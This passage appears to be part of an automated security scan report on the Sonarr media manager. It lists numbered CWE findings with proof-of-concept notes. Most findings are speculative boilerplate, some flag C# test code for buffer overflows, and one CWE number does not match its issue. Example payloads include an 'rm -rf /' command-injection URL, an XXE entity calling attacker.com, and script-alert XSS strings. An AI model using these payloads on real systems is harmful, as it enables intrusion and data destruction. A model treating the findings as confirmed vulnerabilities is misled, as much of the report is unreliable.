Test code uses Json.Deserialize and ToJson methods which might be vulnerable to deserialization attacks in production code.
```

**Impact:**
If production code uses untrusted JSON data for deserialization without proper validation, attackers could exploit deserialization vulnerabilities to execute arbitrary code.

**Proof of Concept:**
If production code deserializes user-provided JSON data without proper validation, an attacker could craft malicious JSON that, when deserialized, executes arbitrary code or causes denial of service.

**How to Test:**
Review production code for JSON deserialization with untrusted input. Test with malicious JSON payloads to verify proper validation and protection against deserialization attacks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneLibrariesTest_JsonTests_JsonFixturecs.py`
---

### 319. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Host/Bootstrap.cs
**Line:** 100

**Description:**
Test code doesn't validate authentication mechanisms that could indicate potential authentication vulnerabilities in production code.

**Evidence:**
```
Test code focuses on configuration and service setup but doesn't validate authentication flows that might be vulnerable in production.
```

**Impact:**
If production code doesn't properly implement authentication mechanisms, attackers could gain unauthorized access to the application.

**Proof of Concept:**
If production code has weak authentication or doesn't properly validate authentication tokens, an attacker could access protected resources without proper credentials.

**How to Test:**
Review production code for authentication implementation. Test with invalid credentials, missing tokens, and session management to verify proper authentication enforcement.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneHost_Bootstrapcs.py`
---

### 320. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Host/Bootstrap.cs
**Line:** 100

**Description:**
Test code doesn't validate CSRF protection mechanisms that could indicate potential CSRF vulnerabilities in production code.

**Evidence:**
```
Test code focuses on service startup and configuration but doesn't validate CSRF protection in web endpoints.
```

**Impact:**
If production code doesn't implement proper CSRF protection, attackers could perform unauthorized actions on behalf of authenticated users.

**Proof of Concept:**
If production code allows state-changing operations without CSRF tokens, an attacker could craft malicious requests that perform actions like changing settings or adding series without user consent.

**How to Test:**
Review production code for CSRF token implementation in web endpoints. Test with requests lacking proper tokens to verify protection against CSRF attacks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneHost_Bootstrapcs.py`
---

### 321. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Host/Bootstrap.cs
**Line:** 100

**Description:**
Test code doesn't validate buffer handling that could indicate potential buffer overflow vulnerabilities in production code.

**Evidence:**
```
Test code focuses on configuration and service setup but doesn't validate buffer handling in string operations or array access.
```

**Impact:**
If production code doesn't properly handle buffer sizes, attackers could exploit buffer overflows to execute arbitrary code or cause denial of service.

**Proof of Concept:**
If production code uses fixed-size buffers without bounds checking, an attacker could provide input longer than buffer capacity to overwrite adjacent memory.

**How to Test:**
Review production code for buffer usage and bounds checking. Test with inputs that exceed buffer sizes to verify proper handling and protection against buffer overflows.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneHost_Bootstrapcs.py`
---

### 322. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/NzbDrone.Host/Bootstrap.cs
**Line:** 100

**Description:**
Test code doesn't validate buffer operations that could indicate potential buffer overflow vulnerabilities in production code.

**Evidence:**
```
Test code focuses on configuration and service setup but doesn't validate buffer operations in string or array handling.
```

**Impact:**
If production code doesn't validate input sizes before buffer operations, attackers could cause buffer overflows leading to code execution or denial of service.

**Proof of Concept:**
If production code copies user input to fixed-size buffers without checking input length, an attacker could provide oversized input to overflow buffers and potentially execute arbitrary code.

**How to Test:**
Review production code for buffer copy operations. Test with oversized inputs to verify proper size checking and buffer overflow protection.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_NzbDroneHost_Bootstrapcs.py`
---

### 323. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Host/Bootstrap.cs
**Line:** 100

**Description:**
Test code doesn't validate format string usage that could indicate potential format string vulnerabilities in production code.

**Evidence:**
```
Test code focuses on configuration and service setup but doesn't validate format string operations that might be vulnerable in production.
```

**Impact:**
If production code uses externally-controlled format strings, attackers could exploit format string vulnerabilities to read/write memory or execute arbitrary code.

**Proof of Concept:**
If production code uses user input directly in format string functions like printf(userInput, ...), an attacker could inject format specifiers to read memory or overwrite variables.

**How to Test:**
Review production code for format string usage with user input. Test with format specifiers in input to verify proper validation and protection against format string attacks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneHost_Bootstrapcs.py`
---

### 324. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Indexers/HttpIndexerBase.cs
**Line:** 220

**Description:**
The indexer URL construction in FetchReleases method could be vulnerable to command injection if user input is not properly sanitized. The URL is constructed from user-provided indexer settings and can be manipulated through various indexer configurations.

**Evidence:**
```
The FetchReleases method constructs URLs using indexer settings without sufficient validation or sanitization, particularly in the context of RSS feed URLs and download URLs.
```

**Impact:**
An attacker could potentially inject commands through indexer configuration parameters, leading to arbitrary code execution or data exfiltration.

**Proof of Concept:**
If an indexer allows user input in BaseUrl or other URL parameters, an attacker could configure an indexer with a malicious URL like 'http://example.com/$(rm -rf /)\' that could be executed during RSS feed processing.

**How to Test:**
1. Create an indexer with a configurable URL parameter
2. Inject command injection payloads into URL parameters
3. Monitor for unexpected system behavior or file system changes during indexer sync

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Indexers_HttpIndexerBasecs.py`
---

### 325. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/RssParser.cs
**Line:** 320

**Description:**
The ParseSize method in RssParser has potential input validation issues when parsing size strings. The regex pattern and parsing logic could be exploited with malformed input.

**Evidence:**
```
The ParseSize method uses regex matching and parsing without comprehensive validation of input data, potentially leading to parsing errors or unexpected behavior.
```

**Impact:**
Malformed size strings in RSS feeds could cause parsing failures or incorrect size calculations, affecting download decisions and storage management.

**Proof of Concept:**
Feed with size string like '1000.000.000 GB' or '1000invalidunit' could cause parsing issues or incorrect size calculations.

**How to Test:**
1. Create RSS feeds with malformed size strings
2. Configure Sonarr to use these feeds
3. Monitor for parsing errors or incorrect size handling in release information

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_RssParsercs.py`
---

### 326. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/Indexers/TorrentRss/TorrentRssSettingsDetector.cs
**Line:** 110

**Description:**
The TorrentRssSettingsDetector uses reflection and dynamic parsing to determine parser settings, which could be vulnerable to code injection if external inputs are not properly validated.

**Evidence:**
```
The code dynamically creates and uses parsers based on feed detection without sufficient validation of the feed content or settings.
```

**Impact:**
Malicious feed content could potentially cause unexpected parser behavior or code execution through the dynamic parser selection mechanism.

**Proof of Concept:**
A specially crafted RSS feed with unexpected XML structure or attributes could cause the parser detection logic to behave unexpectedly or execute unintended code paths.

**How to Test:**
1. Create RSS feeds with unexpected XML structures
2. Configure Sonarr to use these feeds
3. Monitor for unexpected parser behavior or exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_Indexers_TorrentRss_TorrentRssSettingsDetectorcs.py`
---

### 327. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Indexers/IndexerPageableRequestChain.cs
**Line:** 35

**Description:**
The IndexerPageableRequestChain class accesses arrays using index values without proper bounds checking, potentially leading to array index out of bounds exceptions.

**Evidence:**
```
The AddToTier method directly accesses _chains[tierIndex] without validating that tierIndex is within valid bounds.
```

**Impact:**
Malformed indexer configurations or unexpected indexer behavior could cause array index out of bounds exceptions, leading to application crashes or unexpected behavior.

**Proof of Concept:**
If an indexer configuration specifies a tier index that doesn't exist in the chain, accessing _chains[tierIndex] could cause an IndexOutOfRangeException.

**How to Test:**
1. Configure indexers with invalid tier indices
2. Trigger indexer operations
3. Monitor for IndexOutOfRangeException or application crashes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Indexers_IndexerPageableRequestChaincs.py`
---

### 328. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Indexers/HttpIndexerBase.cs
**Line:** 220

**Description:**
The indexer functionality doesn't appear to implement CSRF protection for indexer configuration endpoints, making it vulnerable to CSRF attacks.

**Evidence:**
```
While the code shows indexer configuration and management, there's no evidence of CSRF tokens or protection mechanisms in the indexer configuration flows.
```

**Impact:**
An attacker could trick a logged-in user into modifying indexer configurations without their knowledge, potentially allowing access to unauthorized indexers or changing download behavior.

**Proof of Concept:**
An attacker could create a malicious webpage that submits indexer configuration changes when a user visits it, changing indexer settings without user consent.

**How to Test:**
1. Access indexer configuration endpoints
2. Check for CSRF tokens in forms
3. Try submitting configuration changes from external domains
4. Monitor for unauthorized configuration changes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Indexers_HttpIndexerBasecs.py`
---

### 329. Improper Handling of Dynamically-Generated Code or Code-like Data (CWE-707)

**File:** src/NzbDrone.Core/Indexers/TorrentRss/TorrentRssParserFactory.cs
**Line:** 40

**Description:**
The TorrentRssParserFactory uses dynamic parser selection based on cached settings, which could be vulnerable to manipulation of cached parser configurations.

**Evidence:**
```
The factory caches parser settings using a JSON key derived from indexer settings, but doesn't validate the cached settings before using them.
```

**Impact:**
Maliciously crafted parser settings could be cached and used to parse RSS feeds in unexpected ways, potentially leading to incorrect parsing or security issues.

**Proof of Concept:**
An attacker could manipulate the cached parser settings to force the use of a specific parser configuration that might not properly validate feed content.

**How to Test:**
1. Manually modify cached parser settings
2. Trigger indexer operations
3. Monitor for unexpected parser behavior
4. Check if cached settings are properly validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Indexers_TorrentRss_TorrentRssParserFactorycs.py`
---

### 330. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Indexers/XElementExtensions.cs
**Line:** 50

**Description:**
The ParseDate method in XElementExtensions could be vulnerable to path traversal issues when processing XML files with external entities or when handling file paths.

**Evidence:**
```
While the main vulnerability is in XML parsing, the date parsing logic could be affected by malformed XML that includes path traversal elements.
```

**Impact:**
Malformed XML feeds could cause unexpected behavior or potentially allow path traversal attacks when processing XML content.

**Proof of Concept:**
RSS feeds with specially crafted XML entities or paths could cause parsing issues or unexpected behavior in date handling.

**How to Test:**
1. Create RSS feeds with malformed XML entities
2. Configure Sonarr to process these feeds
3. Monitor for parsing errors or unexpected date handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Indexers_XElementExtensionscs.py`
---

### 331. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Indexers/HttpIndexerBase.cs
**Line:** 240

**Description:**
The logging statements in HttpIndexerBase use format strings that could be controlled by external input, potentially leading to format string vulnerabilities.

**Evidence:**
```
Multiple logging calls use string interpolation with potentially user-controlled values, such as indexer names, URLs, and error messages.
```

**Impact:**
Maliciously crafted indexer names or URLs could cause format string vulnerabilities, potentially leading to information disclosure or unexpected logging behavior.

**Proof of Concept:**
An indexer with a name containing format specifiers like '%s' or '%n' could cause unexpected logging behavior or information disclosure.

**How to Test:**
1. Create indexers with format string characters in names
2. Trigger indexer operations
3. Monitor log output for format string vulnerabilities
4. Check for information disclosure in logs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Indexers_HttpIndexerBasecs.py`
---

### 332. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Indexers/HttpIndexerBase.cs
**Line:** 240

**Description:**
The logging in HttpIndexerBase doesn't properly neutralize output for logs, potentially leading to log injection or information disclosure.

**Evidence:**
```
Multiple log statements include URL and indexer information without proper sanitization, which could be exploited for log injection attacks.
```

**Impact:**
Malicious indexer URLs or names could be used to inject log entries or cause information disclosure through log parsing.

**Proof of Concept:**
An indexer with a URL containing log injection characters could cause unexpected log entries or information disclosure.

**How to Test:**
1. Configure indexers with URLs containing log injection characters
2. Trigger indexer operations
3. Check log output for injection vulnerabilities
4. Monitor for information disclosure in logs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Indexers_HttpIndexerBasecs.py`
---

### 333. Sensitive Cookie Without 'Secure' Flag (CWE-1004)

**File:** src/NzbDrone.Core/Indexers/HttpIndexerBase.cs
**Line:** 220

**Description:**
While not directly shown in this code, the indexer functionality likely handles cookies and session data that may not be properly secured with the 'Secure' flag.

**Evidence:**
```
The code handles HTTP requests and responses but doesn't show explicit cookie security handling, which is common in indexer implementations.
```

**Impact:**
Session cookies or authentication tokens could be transmitted over insecure connections, potentially leading to credential theft or session hijacking.

**Proof of Concept:**
If indexers use cookies for authentication and these aren't marked as secure, they could be intercepted over HTTP connections.

**How to Test:**
1. Monitor HTTP traffic for indexer connections
2. Check cookie headers for Secure flag
3. Test with both HTTP and HTTPS connections
4. Verify cookie security in network traffic

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-1004_src_NzbDroneCore_Indexers_HttpIndexerBasecs.py`
---

### 334. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/Fanzub/FanzubRequestGenerator.cs
**Line:** 67

**Description:**
The FanzubRequestGenerator does not validate or sanitize search query parameters before constructing URLs, potentially allowing injection attacks.

**Evidence:**
```
In GetPagedRequests method, the query parameter is directly appended to the URL without proper validation or encoding, and CleanTitle method only removes specific characters.
```

**Impact:**
Malicious search queries could lead to unexpected behavior or injection vulnerabilities in the constructed URLs.

**Proof of Concept:**
If a search query contains special characters like '&', '=', or other URL encoding characters, they could be interpreted as additional URL parameters, potentially affecting the search behavior.

**How to Test:**
1. Test Fanzub indexer with search queries containing special URL characters
2. Verify that query parameters are properly URL encoded
3. Check if search results are affected by malformed query parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_Fanzub_FanzubRequestGeneratorcs.py`
---

### 335. XML External Entity (XXE) Injection (CWE-91)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabRssParser.cs
**Line:** 30

**Description:**
The NewznabRssParser uses XML parsing without proper XXE protection, potentially allowing attackers to exploit external entity references in RSS feeds.

**Evidence:**
```
The parser uses standard XML parsing methods without disabling external entity resolution, and the PreProcess method handles XML documents without XXE protection.
```

**Impact:**
An attacker could craft malicious RSS feeds with external entity references that could lead to information disclosure, denial of service, or server-side request forgery.

**Proof of Concept:**
Create a malicious RSS feed with XXE payload like <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe; and configure an indexer to use it, potentially causing the server to fetch external resources or read local files.

**How to Test:**
1. Create a test RSS feed with XXE payload
2. Configure an indexer to use this feed
3. Monitor for external resource requests or file access attempts
4. Verify XML parsing is vulnerable to XXE attacks

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-91_src_NzbDroneCore_Indexers_Newznab_NewznabRssParsercs.py`
---

### 336. XML External Entity (XXE) Injection (CWE-91)

**File:** src/NzbDrone.Core/Indexers/Torznab/TorznabRssParser.cs
**Line:** 30

**Description:**
The TorznabRssParser inherits from NewznabRssParser and uses XML parsing without proper XXE protection, potentially allowing attackers to exploit external entity references in RSS feeds.

**Evidence:**
```
The parser inherits XML parsing functionality from NewznabRssParser without additional XXE protection measures.
```

**Impact:**
An attacker could craft malicious RSS feeds with external entity references that could lead to information disclosure, denial of service, or server-side request forgery.

**Proof of Concept:**
Create a malicious RSS feed with XXE payload like <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe; and configure a Torznab indexer to use it, potentially causing the server to fetch external resources or read local files.

**How to Test:**
1. Create a test RSS feed with XXE payload
2. Configure a Torznab indexer to use this feed
3. Monitor for external resource requests or file access attempts
4. Verify XML parsing is vulnerable to XXE attacks

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-91_src_NzbDroneCore_Indexers_Torznab_TorznabRssParsercs.py`
---

### 337. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Indexers/BroadcastheNet/BroadcastheNetParser.cs
**Line:** 100

**Description:**
The BroadcastheNetParser does not properly sanitize release names before returning them, potentially allowing XSS attacks through malicious release titles.

**Evidence:**
```
The CleanReleaseName method only removes backslashes but doesn't sanitize other HTML characters, and the title is directly used in the TorrentInfo object without additional sanitization.
```

**Impact:**
An attacker could craft malicious release names that would execute JavaScript when displayed in the UI, potentially leading to session hijacking or data theft.

**Proof of Concept:**
If a release name contains '<script>alert(1)</script>' and this is displayed in the UI without proper HTML escaping, the script would execute in the user's browser.

**How to Test:**
1. Create a test release with XSS payload in the title
2. Verify that the title is properly sanitized before display
3. Check if the XSS payload executes in the UI
4. Test with various HTML characters and JavaScript payloads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Indexers_BroadcastheNet_BroadcastheNetParsercs.py`
---

### 338. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/Nyaa/NyaaRequestGenerator.cs
**Line:** 50

**Description:**
The NyaaRequestGenerator does not validate or sanitize search terms before constructing URLs, potentially allowing injection attacks through specially crafted search queries.

**Evidence:**
```
The PrepareQuery method only replaces spaces with '+' but doesn't validate or sanitize the input search terms, and these terms are directly used in URL construction.
```

**Impact:**
Malicious search queries could lead to unexpected behavior or injection vulnerabilities in the constructed URLs.

**Proof of Concept:**
If a search query contains URL special characters or injection patterns, they could be interpreted as additional URL parameters or affect the search behavior.

**How to Test:**
1. Test Nyaa indexer with search queries containing special URL characters
2. Verify that search terms are properly sanitized
3. Check if search results are affected by malformed search terms

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_Nyaa_NyaaRequestGeneratorcs.py`
---

### 339. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/FileList/FileListRequestGenerator.cs
**Line:** 80

**Description:**
The FileListRequestGenerator does not validate or sanitize search parameters before constructing API requests, potentially allowing injection attacks.

**Evidence:**
```
The GetRequest method constructs URLs with parameters that are not validated or sanitized, and search terms are directly used in URL construction without proper encoding.
```

**Impact:**
Malicious search parameters could lead to unexpected behavior or injection vulnerabilities in the constructed API requests.

**Proof of Concept:**
If search parameters contain special characters or injection patterns, they could be interpreted as additional URL parameters or affect the API call behavior.

**How to Test:**
1. Test FileList indexer with search parameters containing special characters
2. Verify that parameters are properly URL encoded
3. Check if API calls are affected by malformed parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_FileList_FileListRequestGeneratorcs.py`
---

### 340. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/Torznab/TorznabSettings.cs
**Line:** 45

**Description:**
The TorznabSettings class does not validate the AdditionalParameters field properly, potentially allowing injection attacks through malformed parameters.

**Evidence:**
```
The AdditionalParameters field uses a regex validation but doesn't ensure proper URL parameter encoding or prevent injection patterns.
```

**Impact:**
Malicious additional parameters could lead to unexpected behavior or injection vulnerabilities in API requests.

**Proof of Concept:**
If AdditionalParameters contains malformed URL parameters or injection patterns, they could be interpreted as additional API parameters or affect the API call behavior.

**How to Test:**
1. Configure a Torznab indexer with malformed AdditionalParameters
2. Verify that parameters are properly validated
3. Check if API calls are affected by malformed parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_Torznab_TorznabSettingscs.py`
---

### 341. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/BroadcastheNet/BroadcastheNetRequestGenerator.cs
**Line:** 100

**Description:**
The BroadcastheNetRequestGenerator does not validate or sanitize search parameters before constructing API requests, potentially allowing injection attacks.

**Evidence:**
```
The GetPagedRequests method constructs JSON RPC requests with parameters that are not validated or sanitized, and search terms are directly used in API calls.
```

**Impact:**
Malicious search parameters could lead to unexpected behavior or injection vulnerabilities in the constructed API requests.

**Proof of Concept:**
If search parameters contain special characters or injection patterns, they could be interpreted as additional API parameters or affect the API call behavior.

**How to Test:**
1. Test BroadcastheNet indexer with search parameters containing special characters
2. Verify that parameters are properly validated
3. Check if API calls are affected by malformed parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_BroadcastheNet_BroadcastheNetRequestGeneratorcs.py`
---

### 342. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabRequestGenerator.cs
**Line:** 384

**Description:**
The application does not properly validate or sanitize URL parameters before constructing indexer requests, potentially leading to injection vulnerabilities in the constructed URLs.

**Evidence:**
```
In GetPagedRequests method, the parameters string is directly appended to the URL without proper sanitization, and the AdditionalParameters field from settings is directly included in the URL construction.
```

**Impact:**
Malicious indexer settings could inject additional parameters or manipulate the search query, potentially leading to unexpected behavior or information disclosure.

**Proof of Concept:**
If an indexer has AdditionalParameters set to "&customparam=test&apikey=malicious_key", this would be appended to all search requests, potentially allowing attackers to inject API keys or modify search behavior.

**How to Test:**
1. Configure an indexer with malicious AdditionalParameters
2. Trigger a search request
3. Verify that parameters are properly included in the constructed URL

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Indexers_Newznab_NewznabRequestGeneratorcs.py`
---

### 343. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabCategoryFieldOptionsConverter.cs
**Line:** 44

**Description:**
The application does not properly sanitize category names when generating field options for UI display, potentially allowing XSS attacks through indexer category names.

**Evidence:**
```
The GetFieldSelectOptions method directly uses category names and subcategory names from indexer responses without HTML escaping in the returned FieldSelectOption objects.
```

**Impact:**
If an indexer returns category names with HTML tags, these could be executed in the browser when displayed in the UI, allowing attackers to inject scripts or modify the UI.

**Proof of Concept:**
An indexer that returns a category name like "<script>alert('XSS')</script>TV" would execute the script when displayed in the category selection dropdown.

**How to Test:**
1. Configure an indexer with category names containing HTML tags
2. Navigate to indexer settings
3. Verify that category names are properly escaped in the UI

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Indexers_Newznab_NewznabCategoryFieldOptionsConvertercs.py`
---

### 344. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Configuration/ConfigFileProvider.cs
**Line:** 240

**Description:**
The application stores API keys in the configuration file in cleartext, making them vulnerable to unauthorized access if the configuration file is compromised.

**Evidence:**
```
The ApiKey property in ConfigFileProvider.cs returns the raw API key value without any encryption or obfuscation, and the configuration file is stored in cleartext.
```

**Impact:**
If an attacker gains access to the configuration file, they can immediately extract API keys for indexers and other services, potentially allowing unauthorized access to external services.

**Proof of Concept:**
An attacker with access to the Sonarr config.xml file can directly read indexer API keys without any additional decryption steps.

**How to Test:**
1. Examine the config.xml file
2. Verify that API keys are stored in cleartext
3. Check file permissions to ensure unauthorized access is possible

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Configuration_ConfigFileProvidercs.py`
---

### 345. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Indexers/Newznab/Newznab.cs
**Line:** 103

**Description:**
The application does not properly validate or sanitize indexer URLs, potentially allowing attackers to configure indexers that could redirect or execute malicious code.

**Evidence:**
```
The GetSettings method in Newznab.cs allows arbitrary URLs to be configured for indexers without validation, and the BaseUrl property in NewznabSettings is not validated for URL format or security.
```

**Impact:**
An attacker could configure Sonarr to use malicious indexers that could redirect to phishing sites or execute malicious code when capabilities are fetched.

**Proof of Concept:**
An attacker could configure a custom indexer with BaseUrl set to "http://malicious-indexer.com/api?redirect=evil.com" which could be used to redirect users or collect credentials.

**How to Test:**
1. Configure a custom indexer with a suspicious BaseUrl
2. Trigger indexer capabilities fetching
3. Monitor network requests for unexpected redirects or calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Indexers_Newznab_Newznabcs.py`
---

### 346. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabCapabilitiesProvider.cs
**Line:** 74

**Description:**
The application does not validate array indices when parsing XML responses, potentially leading to out-of-bounds access when indexer capabilities are malformed.

**Evidence:**
```
In ParseCapabilities method, array elements are accessed directly without bounds checking, particularly when parsing categories and subcategories from XML responses.
```

**Impact:**
Malformed indexer responses could cause array index out of bounds exceptions, potentially leading to application crashes or information disclosure.

**Proof of Concept:**
If an indexer returns XML with malformed category structure where attributes are missing or have incorrect values, the application could crash with array index out of bounds errors.

**How to Test:**
1. Create a malformed indexer response with missing XML attributes
2. Configure Sonarr to use this indexer
3. Trigger capabilities fetching
4. Monitor for application crashes or exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Indexers_Newznab_NewznabCapabilitiesProvidercs.py`
---

### 347. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabCapabilitiesProvider.cs
**Line:** 62

**Description:**
The application caches indexer capabilities without proper limits, potentially leading to resource exhaustion when many indexers are configured.

**Evidence:**
```
The _capabilitiesCache in NewznabCapabilitiesProvider.cs uses a simple cache without size limits, and the cache key is based on the entire settings object which could grow large.
```

**Impact:**
With many configured indexers, the cache could grow indefinitely, consuming excessive memory and potentially causing application instability or crashes.

**Proof of Concept:**
Configure Sonarr with 1000+ indexers, each with unique settings, and observe memory usage growth over time.

**How to Test:**
1. Configure multiple indexers with different settings
2. Monitor memory usage over time
3. Check cache size and growth patterns

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCore_Indexers_Newznab_NewznabCapabilitiesProvidercs.py`
---

### 348. Information Exposure (CWE-200)

**File:** src/NzbDrone.Core/Indexers/Newznab/NewznabCapabilitiesProvider.cs
**Line:** 85

**Description:**
The application exposes detailed error information from indexer responses, potentially revealing internal implementation details or sensitive data.

**Evidence:**
```
In the catch blocks of FetchCapabilities method, detailed error information including response data is logged but not properly sanitized before being exposed.
```

**Impact:**
Detailed error messages from indexer responses could reveal internal system information, configuration details, or sensitive data that should remain private.

**Proof of Concept:**
When an indexer returns an error response, the full response content including headers and body is logged with trace level, potentially exposing sensitive information.

**How to Test:**
1. Configure an indexer that returns error responses
2. Trigger capabilities fetching
3. Check log files for detailed error information exposure

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCore_Indexers_Newznab_NewznabCapabilitiesProvidercs.py`
---

### 349. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Housekeeping/Housekeepers/DeleteBadMediaCovers.cs
**Line:** 60

**Description:**
The DeleteBadMediaCovers service uses a hardcoded date for filtering images without validation, potentially leading to incorrect filtering or processing of media files.

**Evidence:**
```
The code uses a hardcoded date 'new DateTime(2014, 12, 27)' for filtering images without validating the date format or checking if it's a reasonable cutoff date.
```

**Impact:**
Incorrect date filtering could lead to either too many or too few images being processed, potentially causing performance issues or missing cleanup opportunities.

**Proof of Concept:**
If the hardcoded date is set to a future date, all images would be considered valid and no cleanup would occur, or if set to a past date, all images would be deleted unnecessarily.

**How to Test:**
1. Change the hardcoded date to various values
2. Monitor the cleanup behavior
3. Verify that the date filtering works as expected
4. Test edge cases like leap years or invalid dates

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Housekeeping_Housekeepers_DeleteBadMediaCoverscs.py`
---

### 350. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Qualities/QualityModel.cs
**Line:** 70

**Description:**
The QualityModel class uses array indexing without proper bounds checking, potentially leading to array out of bounds exceptions.

**Evidence:**
```
In the CompareTo method, the code accesses Quality.DefaultQualityDefinitions.First() without checking if the collection is empty or if the quality exists in the definitions.
```

**Impact:**
If Quality.DefaultQualityDefinitions is empty or doesn't contain the quality being compared, an exception will be thrown, potentially crashing the application or causing unexpected behavior.

**Proof of Concept:**
If Quality.DefaultQualityDefinitions is empty or doesn't contain a quality being compared, the First() method will throw an exception, causing the comparison to fail.

**How to Test:**
1. Create a scenario where Quality.DefaultQualityDefinitions is empty
2. Try to compare QualityModel objects
3. Verify exception handling
4. Test with various quality definitions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Qualities_QualityModelcs.py`
---

### 351. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Core/Update/InstallUpdateService.cs
**Line:** 180

**Description:**
The update installation process lacks CSRF protection, making it vulnerable to cross-site request forgery attacks.

**Evidence:**
